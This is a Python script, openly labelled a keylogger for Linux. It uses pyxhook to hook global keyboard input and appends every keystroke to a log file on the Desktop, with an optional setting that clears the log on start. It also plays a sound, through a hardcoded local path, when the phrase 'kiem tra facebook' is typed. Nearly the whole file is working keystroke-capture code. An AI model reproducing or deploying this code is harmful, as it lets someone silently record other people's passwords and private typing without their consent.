# Python code for keylogger to be used in linux
# Run `sudo apt-get install python-xlib`

import os
import pyxhook
import subprocess

class Queue:
    def __init__(self, n):
        self.items = []
        self.size = n

    def push(self, item):
        self.items.append(item)

        if len(self.items) > self.size:
            self.items.pop(0)

    def pop(self):
        return self.items.pop()

    def is_empty(self):
        return self.items == []


# This tells the keylogger where the log file will go.
# You can set the file path as an environment variable ('pylogger_file'),
# or use the default ~/Desktop/file.log
log_file = os.environ.get('pylogger_file', os.path.expanduser('~/Desktop/file.log')
)
# Allow setting the cancel key from environment args, Default: `
cancel_key = ord(os.environ.get('pylogger_cancel','`')[0]
)

code = [x for x in 'kiem tra facebook']

print(code)
key_queue = Queue(len(code))

# Allow clearing the log file on start, if pylogger_clean is defined.
if os.environ.get('pylogger_clean', None) is not None:
    try:
        os.remove(log_file)
    except EnvironmentError:
        # File does not exist, or no permissions.
        pass


# creating key pressing event and saving it into log file
def OnKeyPress(event):
    with open(log_file, 'a') as f:
        f.write('{}\n'.format(event.Key))



        if event.Key == 'space':
            event.Key = ' '

        key_queue.push(event.Key)
        print(key_queue.items)
        if key_queue.items == code:
            subprocess.call(["/home/minhdq99hp/anaconda3/bin/python", "test_play_sound.py", "&"])


def OnKeyboardEvent(event):
    print('MessageName:',event.MessageName)
    print('Window:',event.Window)
    print('WindowName:',event.WindowName)
    print('Ascii:', event.Ascii, chr(event.Ascii))
    print('Key:', event.Key)
    print('KeyID:', event.KeyID)
    print('ScanCode:', event.ScanCode)

    print('---')

    return True

# create a hook manager object
new_hook = pyxhook.HookManager()
new_hook.KeyDown = OnKeyPress
# new_hook.KeyDown = OnKeyboardEvent
# set the hook
new_hook.HookKeyboard()

try:
    new_hook.start()  # start the hook
except KeyboardInterrupt:
    # User cancelled from command line.
    pass
except Exception as ex:
    # Write exceptions to the log file, for analysis later.
    msg = 'Error while catching events:\n  {}'.format(ex)
    pyxhook.print_err(msg)
    with open(log_file, 'a') as f:
        f.write('\n{}'.format(msg))